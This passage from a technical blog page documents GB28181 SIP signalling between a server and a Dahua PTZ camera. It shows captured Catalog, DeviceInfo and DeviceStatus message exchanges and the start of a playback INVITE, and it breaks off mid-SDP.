class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs xml">MESSAGE sip:34020000002000000010@192.168.6.106:5062 SIP/2.0<br>Via: SIP/2.0/UDP 192.168.6.71:5060;rport;branch=z9hG4bK1121513722<br>From: &lt;sip:34020000001320000002@192.168.6.71:5060&gt;;tag=616675198<br>To: &lt;sip:34020000002000000010@192.168.6.106:5062&gt;<br>Call-ID: 140588148@192.168.6.71<br>CSeq: 20 MESSAGE<br>Max-Forwards: 70<br>User-Agent: SIP UAS V3.0.0.675168<br>Content-Type: Application/MANSCDP+xml<br>Content-Length:   898<br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;GB2312&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Response</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">CmdType</span>&gt;</span>Catalog<span class="hljs-tag">&lt;/<span class="hljs-name">CmdType</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">SN</span>&gt;</span>7<span class="hljs-tag">&lt;/<span class="hljs-name">SN</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">DeviceID</span>&gt;</span>34020000001320000002<span class="hljs-tag">&lt;/<span class="hljs-name">DeviceID</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">SumNum</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">SumNum</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">DeviceList</span> <span class="hljs-attr">Num</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Item</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">DeviceID</span>&gt;</span>34020000001310000001<span class="hljs-tag">&lt;/<span class="hljs-name">DeviceID</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">Name</span>&gt;</span>DH71<span class="hljs-tag">&lt;/<span class="hljs-name">Name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">Manufacturer</span>&gt;</span>Dahua<span class="hljs-tag">&lt;/<span class="hljs-name">Manufacturer</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">Model</span>&gt;</span>DH-SD-6C3230UE-HN<span class="hljs-tag">&lt;/<span class="hljs-name">Model</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">Owner</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">Owner</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">CivilCode</span>&gt;</span>340200<span class="hljs-tag">&lt;/<span class="hljs-name">CivilCode</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">Address</span>&gt;</span>axy<span class="hljs-tag">&lt;/<span class="hljs-name">Address</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">Parental</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">Parental</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">ParentID</span>&gt;</span>34020000001320000002<span class="hljs-tag">&lt;/<span class="hljs-name">ParentID</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">RegisterWay</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">RegisterWay</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">Secrecy</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">Secrecy</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">StreamNum</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">StreamNum</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">Status</span>&gt;</span>ON<span class="hljs-tag">&lt;/<span class="hljs-name">Status</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">Info</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">PTZType</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">PTZType</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">DownloadSpeed</span>&gt;</span>1/2/4/8<span class="hljs-tag">&lt;/<span class="hljs-name">DownloadSpeed</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">Info</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Item</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">DeviceList</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Response</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.71:5060</span>;rport=<span class="hljs-number">5060</span>;branch=z9hG4bK1121513722<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">616675198</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1904472289</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">140588148</span>@<span class="hljs-number">192.168.6.71</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><h4 id="2-2-DeviceInfo"><a href="#2-2-DeviceInfo" class="headerlink" title="2.2 DeviceInfo"></a>2.2 DeviceInfo</h4><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MESSAGE</span> sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK2342238638<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1499615989</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2283720204</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">Content</span>-Type: application/MANSCDP+xml<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T14:<span class="hljs-number">22</span>:<span class="hljs-number">30</span>.<span class="hljs-number">292</span><br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">128</span><br><br><span class="hljs-section">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-section">&lt;Query&gt;</span><br><span class="hljs-section">&lt;CmdType&gt;</span><span class="hljs-attribute">DeviceInfo</span>&lt;/CmdType&gt;<br><span class="hljs-section">&lt;SN&gt;</span><span class="hljs-attribute">9</span>&lt;/SN&gt;<br><span class="hljs-section">&lt;DeviceID&gt;</span><span class="hljs-attribute">34020000001320000002</span>&lt;/DeviceID&gt;<br><span class="hljs-section">&lt;/Query&gt;</span><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK2342238638<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1499615989</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1276142286</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2283720204</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs xml">MESSAGE sip:34020000002000000010@192.168.6.106:5062 SIP/2.0<br>Via: SIP/2.0/UDP 192.168.6.71:5060;rport;branch=z9hG4bK1885711354<br>From: &lt;sip:34020000001320000002@192.168.6.71:5060&gt;;tag=164383918<br>To: &lt;sip:34020000002000000010@192.168.6.106:5062&gt;<br>Call-ID: 107554108@192.168.6.71<br>CSeq: 20 MESSAGE<br>Max-Forwards: 70<br>User-Agent: SIP UAS V3.0.0.675168<br>Content-Type: Application/MANSCDP+xml<br>Content-Length:   559<br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;GB2312&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Response</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">CmdType</span>&gt;</span>DeviceInfo<span class="hljs-tag">&lt;/<span class="hljs-name">CmdType</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">SN</span>&gt;</span>9<span class="hljs-tag">&lt;/<span class="hljs-name">SN</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">DeviceID</span>&gt;</span>34020000001320000002<span class="hljs-tag">&lt;/<span class="hljs-name">DeviceID</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">DeviceName</span>&gt;</span>DH-SD-6C3230UE-HN<span class="hljs-tag">&lt;/<span class="hljs-name">DeviceName</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Result</span>&gt;</span>OK<span class="hljs-tag">&lt;/<span class="hljs-name">Result</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">DeviceType</span>&gt;</span>SD<span class="hljs-tag">&lt;/<span class="hljs-name">DeviceType</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Manufacturer</span>&gt;</span>Dahua<span class="hljs-tag">&lt;/<span class="hljs-name">Manufacturer</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Model</span>&gt;</span>DH-SD-6C3230UE-HN<span class="hljs-tag">&lt;/<span class="hljs-name">Model</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Firmware</span>&gt;</span>2.623.0000000.17.R,2019-01-19<span class="hljs-tag">&lt;/<span class="hljs-name">Firmware</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">MaxCamera</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">MaxCamera</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">MaxAlarm</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">MaxAlarm</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Channel</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">Channel</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Port</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">Port</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LoginName</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">LoginName</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Password</span>&gt;</span>******<span class="hljs-tag">&lt;/<span class="hljs-name">Password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Response</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.71:5060</span>;rport=<span class="hljs-number">5060</span>;branch=z9hG4bK1885711354<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">164383918</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">3627078230</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">107554108</span>@<span class="hljs-number">192.168.6.71</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><h4 id="2-3-DeviceStatus"><a href="#2-3-DeviceStatus" class="headerlink" title="2.3 DeviceStatus"></a>2.3 DeviceStatus</h4><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MESSAGE</span> sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK1466769672<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">793798457</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">639275922</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">Content</span>-Type: application/MANSCDP+xml<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T14:<span class="hljs-number">24</span>:<span class="hljs-number">54</span>.<span class="hljs-number">979</span><br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">131</span><br><br><span class="hljs-section">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-section">&lt;Query&gt;</span><br><span class="hljs-section">&lt;CmdType&gt;</span><span class="hljs-attribute">DeviceStatus</span>&lt;/CmdType&gt;<br><span class="hljs-section">&lt;SN&gt;</span><span class="hljs-attribute">10</span>&lt;/SN&gt;<br><span class="hljs-section">&lt;DeviceID&gt;</span><span class="hljs-attribute">34020000001320000002</span>&lt;/DeviceID&gt;<br><span class="hljs-section">&lt;/Query&gt;</span><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK1466769672<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">793798457</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1375134481</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">639275922</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs xml">MESSAGE sip:34020000002000000010@192.168.6.106:5062 SIP/2.0<br>Via: SIP/2.0/UDP 192.168.6.71:5060;rport;branch=z9hG4bK1852218770<br>From: &lt;sip:34020000001320000002@192.168.6.71:5060&gt;;tag=2099459286<br>To: &lt;sip:34020000002000000010@192.168.6.106:5062&gt;<br>Call-ID: 1675775636@192.168.6.71<br>CSeq: 20 MESSAGE<br>Max-Forwards: 70<br>User-Agent: SIP UAS V3.0.0.675168<br>Content-Type: Application/MANSCDP+xml<br>Content-Length:   639<br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;GB2312&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Response</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">CmdType</span>&gt;</span>DeviceStatus<span class="hljs-tag">&lt;/<span class="hljs-name">CmdType</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">SN</span>&gt;</span>10<span class="hljs-tag">&lt;/<span class="hljs-name">SN</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">DeviceID</span>&gt;</span>34020000001320000002<span class="hljs-tag">&lt;/<span class="hljs-name">DeviceID</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Result</span>&gt;</span>OK<span class="hljs-tag">&lt;/<span class="hljs-name">Result</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Online</span>&gt;</span>ONLINE<span class="hljs-tag">&lt;/<span class="hljs-name">Online</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Status</span>&gt;</span>OK<span class="hljs-tag">&lt;/<span class="hljs-name">Status</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">DeviceTime</span>&gt;</span>2024-05-17T14:24:54<span class="hljs-tag">&lt;/<span class="hljs-name">DeviceTime</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Encode</span>&gt;</span>ON<span class="hljs-tag">&lt;/<span class="hljs-name">Encode</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Record</span>&gt;</span>OFF<span class="hljs-tag">&lt;/<span class="hljs-name">Record</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Alarmstatus</span> <span class="hljs-attr">Num</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Item</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">DeviceID</span>&gt;</span>34020000001340000001<span class="hljs-tag">&lt;/<span class="hljs-name">DeviceID</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">DutyStatus</span>&gt;</span>ONDUTY<span class="hljs-tag">&lt;/<span class="hljs-name">DutyStatus</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Item</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Item</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">DeviceID</span>&gt;</span>34020000001340000002<span class="hljs-tag">&lt;/<span class="hljs-name">DeviceID</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">DutyStatus</span>&gt;</span>ONDUTY<span class="hljs-tag">&lt;/<span class="hljs-name">DutyStatus</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Item</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Alarmstatus</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Response</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.71:5060</span>;rport=<span class="hljs-number">5060</span>;branch=z9hG4bK1852218770<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000001320000002</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">2099459286</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">3863402345</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1675775636</span>@<span class="hljs-number">192.168.6.71</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><h3 id="3-设备点播"><a href="#3-设备点播" class="headerlink" title="3. 设备点播"></a>3. 设备点播</h3><h4 id="3-1-播放"><a href="#3-1-播放" class="headerlink" title="3.1 播放"></a>3.1 播放</h4><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">INVITE</span> sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.71:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK2420824424<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">4086715875</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.71:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">1316183468</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> INVITE<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Content</span>-Type: application/sdp<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T14:<span class="hljs-number">32</span>:<span class="hljs-number">48</span>.<span class="hljs-number">919</span><br><span class="hljs-attribute">Subject</span>: <span class="hljs-number">34020000001320000002</span>:<span class="hljs-number">04020000001320000002</span>,<span class="hljs-number">34020000002000000010</span>:<span class="hljs-number">1002</span><br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">226</span><br><br><span class="hljs-attribute">v</span>=<span class="hljs-number">0</span><br><span class="hljs-attribute">o</span>=<span class="hljs-number">34020000002000000010</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> IN IP4 <span class="hljs-number">192.168.6.106</span><br><span class="hljs-attribute">s</span>=Play<br><span class="hljs-attribute">c</span>=IN IP4 <span 